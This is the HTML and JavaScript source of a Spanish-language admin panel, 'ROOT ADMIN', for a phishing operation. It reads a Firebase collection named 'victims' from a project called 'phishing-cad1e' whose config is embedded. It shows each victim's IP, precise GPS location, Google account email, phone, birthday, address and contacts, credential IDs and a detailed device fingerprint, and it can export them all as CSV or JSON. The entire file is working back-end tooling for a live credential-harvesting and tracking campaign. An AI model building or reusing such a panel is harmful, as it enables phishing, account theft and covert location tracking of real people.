<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>ROOT ADMIN</title>
<style>
:root{
  --bg:#080808;--bg2:#0f0f0f;--bg3:#161616;--border:#1e1e1e;
  --accent:#EE1D52;--a2:#69C9D0;--text:#c8c8c8;--dim:#555;
  --green:#22c55e;--yellow:#eab308;--purple:#a855f7;
}
*{margin:0;padding:0;box-sizing:border-box;}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:.875rem;min-height:100vh;}
header{background:var(--bg2);border-bottom:1px solid var(--border);padding:13px 18px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;}
.logo{font-size:.95rem;font-weight:700;letter-spacing:2px;}.logo span{color:var(--accent);}
.dot{width:8px;height:8px;border-radius:50%;background:var(--dim);display:inline-block;margin-right:6px;transition:background .3s;}
.dot.live{background:var(--green);animation:pulse 1.5s infinite;}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
#stxt{font-size:.76rem;color:var(--dim);}
#stats{display:flex;gap:1px;background:var(--border);border-bottom:1px solid var(--border);overflow-x:auto;}
.sc{flex:1;min-width:60px;background:var(--bg2);padding:10px 6px;text-align:center;}
.sc .v{font-size:1.25rem;font-weight:700;color:var(--accent);}
.sc .l{font-size:.57rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-top:2px;}
#toolbar{padding:10px 14px;display:flex;gap:8px;flex-wrap:wrap;border-bottom:1px solid var(--border);background:var(--bg2);}
#sb{flex:1;min-width:150px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:8px 12px;color:var(--text);font-size:.83rem;outline:none;}
#sb:focus{border-color:var(--a2);}
.tb{background:var(--bg3);border:1px solid var(--border);color:var(--dim);padding:8px 11px;border-radius:7px;font-size:.72rem;cursor:pointer;transition:all .2s;white-space:nowrap;}
.tb:hover{border-color:var(--accent);color:var(--accent);}
main{padding:13px 14px;}
#entries{display:flex;flex-direction:column;gap:10px;}
.empty{text-align:center;color:var(--dim);padding:60px 20px;font-size:.8rem;line-height:2.2;}
.spin{width:34px;height:34px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:sp .8s linear infinite;margin:0 auto 14px;}
@keyframes sp{to{transform:rotate(360deg)}}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
.card.ping{animation:ping .7s ease;}
@keyframes ping{0%{border-color:var(--accent);box-shadow:0 0 18px rgba(238,29,82,.35);}100%{border-color:var(--border);box-shadow:none;}}
.ch{display:flex;align-items:center;gap:8px;padding:11px 14px;cursor:pointer;user-select:none;background:var(--bg3);flex-wrap:wrap;}
.ch:hover{background:#1a1a1a;}
.chash{font-family:monospace;font-size:.77rem;color:var(--accent);background:rgba(238,29,82,.09);padding:2px 7px;border-radius:4px;flex-shrink:0;}
.cip{font-family:monospace;font-size:.82rem;color:var(--a2);font-weight:600;}
.cloc{font-size:.73rem;color:var(--dim);flex:1;min-width:50px;}
.cts{font-size:.65rem;color:var(--dim);flex-shrink:0;white-space:nowrap;}
.carr{color:var(--dim);font-size:.75rem;transition:transform .2s;flex-shrink:0;}
.carr.o{transform:rotate(90deg);}
.cb{display:none;padding:13px;border-top:1px solid var(--border);}
.cb.o{display:block;}
.st{font-size:.6rem;color:var(--dim);text-transform:uppercase;letter-spacing:1.5px;margin:12px 0 6px;border-bottom:1px solid var(--border);padding-bottom:4px;}
.st:first-child{margin-top:0;}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(145px,1fr));gap:4px 12px;}
.fr{display:flex;flex-direction:column;padding:3px 0;}
.fl{font-size:.58rem;color:#2e2e2e;text-transform:uppercase;letter-spacing:.6px;}
.fv{font-size:.78rem;color:#bbb;word-break:break-all;margin-top:2px;font-family:monospace;}
.fv.a{color:var(--accent);font-weight:600;}
.fv.a2{color:var(--a2);font-weight:600;}
.fv.g{color:var(--green);font-weight:600;}
.fv.y{color:var(--yellow);}
.fv.p{color:var(--purple);}
.fv.d{color:var(--dim);}
.mlink{display:inline-flex;align-items:center;gap:5px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--a2);font-size:.75rem;text-decoration:none;margin-top:7px;}
.mlink:hover{border-color:var(--a2);}
.acts{display:flex;gap:7px;margin-top:11px;flex-wrap:wrap;}
.btn{background:var(--bg3);border:1px solid var(--border);color:var(--dim);padding:6px 11px;border-radius:6px;font-size:.72rem;cursor:pointer;transition:all .2s;text-decoration:none;display:inline-block;}
.btn:hover{border-color:var(--accent);color:var(--accent);}
.badge{display:inline-block;padding:1px 5px;border-radius:3px;font-size:.57rem;font-weight:600;text-transform:uppercase;margin-left:3px;vertical-align:middle;}
.bg{background:rgba(34,197,94,.12);color:var(--green);}
.ba2{background:rgba(105,201,208,.12);color:var(--a2);}
.by{background:rgba(234,179,8,.12);color:var(--yellow);}
.bp{background:rgba(168,85,247,.12);color:var(--purple);}
</style>
</head>
<body>
<header>
  <div class="logo"><span>ROOT</span> ADMIN</div>
  <span><span class="dot" id="dot"></span><span id="stxt">conectando...</span></span>
</header>
<div id="stats">
  <div class="sc"><div class="v" id="s0">0</div><div class="l">Total</div></div>
  <div class="sc"><div class="v" id="s1">0</div><div class="l">Hoy</div></div>
  <div class="sc"><div class="v" id="s2">0</div><div class="l">Google</div></div>
  <div class="sc"><div class="v" id="s3">0</div><div class="l">GPS</div></div>
  <div class="sc"><div class="v" id="s4">0</div><div class="l">Batería</div></div>
  <div class="sc"><div class="v" id="s5">0</div><div class="l">Países</div></div>
</div>
<div id="toolbar">
  <input id="sb" placeholder="🔍  IP, email, país, hash..." oninput="fil()">
  <button class="tb" onclick="xCSV()">⬇ CSV</button>
  <button class="tb" onclick="xJSON()">⬇ JSON</button>
  <button class="tb" id="bsort" onclick="tSort()">↓ Recientes</button>
  <button class="tb" id="bclear" onclick="clearAll()" style="border-color:#3a1010;color:#7a2020;">🗑 Vaciar todo</button>
</div>
<main><div id="entries"><div class="empty"><div class="spin"></div>Conectando con Firebase...</div></div></main>

<script type="module">
import { initializeApp }     from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getFirestore, collection, onSnapshot, deleteDoc, doc, query, orderBy }
  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const app = initializeApp({
  apiKey:            "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0",
  authDomain:        "phishing-cad1e.firebaseapp.com",
  projectId:         "phishing-cad1e",
  storageBucket:     "phishing-cad1e.firebasestorage.app",
  messagingSenderId: "48855278637",
  appId:             "1:48855278637:web:cd6386bf2342f0b63344a4"
});
const db = getFirestore(app);

let all = [], desc = true;

// ── REALTIME LISTENER ─────────────────────────────────
const q = query(collection(db,'victims'));
onSnapshot(q, snap => {
  all = snap.docs.map(d => ({ id: d.id, data: d.data() }));
  sort();
  render();
  stats();
  status('live — '+all.length+' entradas', true);
}, err => {
  status('error: '+err.message, false);
});

function status(msg, live){
  document.getElementById('stxt').textContent = msg;
  document.getElementById('dot').className = 'dot'+(live?' live':'');
}

function sort(){
  all.sort((a,b)=>{
    const ta=Number(a.data.ts||0), tb=Number(b.data.ts||0);
    return desc ? tb-ta : ta-tb;
  });
}

// ── STATS ─────────────────────────────────────────────
function stats(){
  const today=new Date().toDateString();
  const paises=new Set();
  let hoy=0,g=0,gps=0,bat=0;
  for(const {data:d} of all){
    if(d.ts && new Date(Number(d.ts)).toDateString()===today) hoy++;
    if(ok(d.gEmail)||ok(d.google_email)||ok(d.gPhone)) g++;
    if(ok(d.lat)||ok(d.gps_lat)) gps++;
    if(ok(d.bat)) bat++;
    const c=d.country||d.ip_country;
    if(c&&c!=='') paises.add(c);
  }
  sv('s0',all.length); sv('s1',hoy); sv('s2',g);
  sv('s3',gps); sv('s4',bat); sv('s5',paises.size);
}
function sv(id,v){ document.getElementById(id).textContent=v; }
function ok(v){ return v&&v!==''&&v!=='n/a'&&v!=='null'&&v!=='undefined'; }

// ── FILTER ────────────────────────────────────────────
window.fil = () => render(document.getElementById('sb').value.toLowerCase());

window.tSort = () => {
  desc=!desc;
  document.getElementById('bsort').textContent=desc?'↓ Recientes':'↑ Antiguos';
  sort(); render();
};

// ── RENDER ────────────────────────────────────────────
function render(f=''){
  const box=document.getElementById('entries');
  const list=f ? all.filter(({data:d})=>Object.values(d).some(v=>String(v).toLowerCase().includes(f))) : all;
  if(!list.length){
    box.innerHTML=`<div class="empty">${f?'Sin resultados para "'+f+'"':'<div class="spin"></div>Esperando entradas...'}</div>`;
    return;
  }
  box.innerHTML=list.map(({id,data:d})=>card(id,d)).join('');
}

// ── CARD ──────────────────────────────────────────────
function card(id,d){
  const ts  = ok(d.ts) ? new Date(Number(d.ts)).toLocaleString('es') : '?';
  const ip  = d.ip||d.ipLocal1||'?';
  const loc = [d.city,d.country].filter(v=>v&&v!=='').join(', ');
  const hsh = d.hash||id.slice(0,8);
  const hasG   = ok(d.gEmail)||ok(d.google_email)||ok(d.gPhone)||ok(d.gName);
  const hasGPS = ok(d.lat)||ok(d.gps_lat)||ok(d.gpsLat);
  const hasBat = ok(d.bat);
  const hasCr  = ok(d.credId);
  const lat = d.lat||d.gps_lat||''; const lon=d.lon||d.gps_lon||'';

  const badges=[
    hasG   ?'<span class="badge bg">G</span>'   :'',
    hasGPS ?'<span class="badge by">GPS</span>' :'',
    hasCr  ?'<span class="badge bp">CR</span>'  :'',
    hasBat ?'<span class="badge ba2">🔋</span>' :'',
  ].join('');

  const gmap = hasGPS&&lat?`<a class="mlink" href="https://maps.google.com/?q=${lat},${lon}" target="_blank">🗺 Mapa (${Number(lat).toFixed(5)}, ${Number(lon).toFixed(5)})</a>`:'';

  const R=(pairs)=>pairs.map(([k,c])=>{
    const v=d[k]; const dsp=ok(v)?String(v).slice(0,280):'—';
    return `<div class="fr"><span class="fl">${k}</span><span class="fv ${c||''}">${dsp}</span></div>`;
  }).join('');

  return `<div class="card" id="c-${id}">
  <div class="ch" onclick="tog('${id}')">
    <span class="chash">${hsh}</span>
    <span class="cip">${ip}</span>
    <span class="cloc">${loc}${badges}</span>
    <span class="cts">${ts}</span>
    <span class="carr" id="ar-${id}">▶</span>
  </div>
  <div class="cb" id="cb-${id}">
    <div class="st">🌐 Red / IP</div>
    <div class="grid">${R([['ip','a'],['ipLocal1','a2'],['ipLocal2','a2'],['ipLocal3','a2'],['city',''],['country',''],['region',''],['org',''],['asn','d'],['postal','d'],['ipTZ','d'],['lat','d'],['lon','d']])}</div>
    ${gmap}
    ${hasGPS?`<div class="st">📍 GPS Real</div><div class="grid">${R([['gpsLat','g'],['gpsLon','g'],['lat','g'],['lon','g'],['gps_lat','g'],['gpsAcc',''],['gpsAlt',''],['gpsSpd',''],['gpsHead',''],['gps','']])}</div>`:''}
    ${hasG?`
    <div class="st">🔑 Cuenta Google</div>
    <div class="grid">${R([['gEmail','a'],['gName',''],['gGivenName',''],['gLastName',''],
      ['gPhone','a2'],['gPhone2','a2'],['gAllPhones','y'],
      ['gBirthday','y'],['gGender',''],['gAddress',''],
      ['gCity',''],['gCountry',''],['gPostal',''],
      ['gOrg',''],['gTitle',''],['gBio','d'],
      ['google_email','a'],['gHD',''],['gSub','d']
    ])}</div>
    <div class="st">👥 Contactos</div>
    <div class="grid">${R([['contactsCount','y'],
      ['contact1','a2'],['contact2','a2'],['contact3','a2'],['contact4',''],['contact5','']
    ])}</div>`:''}
    ${hasCr?`<div class="st">🗝 Credenciales</div><div class="grid">${R([['credId','p'],['credName',''],['credType','d']])}</div>`:''}
    <div class="st">🖥 Dispositivo</div>
    <div class="grid">${R([['ua','d'],['platform',''],['vendor',''],['screen',''],['dpr',''],['orient',''],['depth','d'],['cores',''],['memory',''],['touch',''],['innerW','d'],['innerH','d']])}</div>
    ${hasBat?`<div class="st">🔋 Batería</div><div class="grid">${R([['bat','y'],['batChg',''],['batDisT','d']])}</div>`:''}
    <div class="st">🌍 Idioma / Zona</div>
    <div class="grid">${R([['lang',''],['langs','d'],['tz',''],['tzOffset',''],['locale',''],['dark','']])}</div>
    <div class="st">⚙ Conectividad</div>
    <div class="grid">${R([['connType',''],['connEff',''],['connDl',''],['connRtt',''],['online',''],['stQuota',''],['stUsed',''],['sw','d'],['bt',''],['nfc',''],['notif','y']])}</div>
    <div class="st">🔬 Fingerprint</div>
    <div class="grid">${R([['hash','a'],['canvas','d'],['audio','d'],['glUVendor',''],['glURenderer',''],['glVer','d'],['glMax','d'],['fonts','d'],['fontN',''],['wasm',''],['webGPU',''],['ptrFine',''],['ptrCoarse','']])}</div>
    <div class="st">🎬 Codecs / URL</div>
    <div class="grid">${R([['h264',''],['vp9',''],['mp3',''],['ogg',''],['referer',''],['url','d'],['params','d'],['ts','d'],['_exit','d']])}</div>
    <div class="acts">
      <button class="btn" onclick="cpJSON('${id}')">📋 JSON</button>
      <button class="btn" onclick="cpIP('${id}')">📌 IP</button>
      ${hasGPS&&lat?`<a class="btn" href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="text-decoration:none;color:var(--dim)">🗺</a>`:''}
      <button class="btn" style="margin-left:auto" onclick="del('${id}')">🗑</button>
    </div>
  </div>
</div>`;
}

// ── ACTIONS ───────────────────────────────────────────
window.tog=(id)=>{
  document.getElementById('cb-'+id).classList.toggle('o');
  document.getElementById('ar-'+id).classList.toggle('o');
};

window.cpJSON=(id)=>{
  const e=all.find(x=>x.id===id); if(!e) return;
  const t=JSON.stringify(e.data,null,2);
  navigator.clipboard?.writeText(t).catch(()=>lcp(t));
  const b=document.querySelector('#c-'+id+' .btn');
  if(b){b.textContent='✓';setTimeout(()=>b.textContent='📋 JSON',1500);}
};

window.cpIP=(id)=>{
  const e=all.find(x=>x.id===id); if(!e) return;
  const ip=e.data.ip||e.data.ipLocal1||'';
  navigator.clipboard?.writeText(ip).catch(()=>lcp(ip));
};

function lcp(t){const a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');document.body.removeChild(a);}

window.del=async(id)=>{
  if(!confirm('¿Eliminar?')) return;
  try{ await deleteDoc(doc(db,'victims',id)); } catch(e){ alert('Error: '+e.message); }
};

// ── CLEAR ALL ─────────────────────────────────────────
window.clearAll=async()=>{
  if(!all.length){alert('Ya está vacío');return;}
  if(!confirm(`¿Eliminar las ${all.length} entradas? No hay vuelta atrás.`)) return;
  const btn=document.getElementById('bclear');
  btn.textContent='Vaciando...'; btn.disabled=true;
  try{
    await Promise.all(all.map(e=>deleteDoc(doc(db,'victims',e.id))));
  } catch(e){ alert('Error: '+e.message); }
  btn.textContent='🗑 Vaciar todo'; btn.disabled=false;
};

// ── EXPORT ────────────────────────────────────────────
window.xCSV=()=>{
  if(!all.length){alert('Sin datos');return;}
  const keys=[...new Set(all.flatMap(e=>Object.keys(e.data)))].sort();
  const esc=v=>'"'+String(v).replace(/"/g,'""')+'"';
  const rows=[['id',...keys].map(esc).join(','),
    ...all.map(e=>[esc(e.id),...keys.map(k=>esc(e.data[k]??''))].join(','))].join('\r\n');
  dl('victims_'+Date.now()+'.csv',rows,'text/csv');
};

window.xJSON=()=>{
  if(!all.length){alert('Sin datos');return;}
  dl('victims_'+Date.now()+'.json',JSON.stringify(all.map(e=>({id:e.id,...e.data})),null,2),'application/json');
};

function dl(name,content,mime){
  const a=document.createElement('a');
  a.href=URL.createObjectURL(new Blob([content],{type:mime}));
  a.download=name; document.body.appendChild(a); a.click(); document.body.removeChild(a);
}
</script>
</body>
</html>
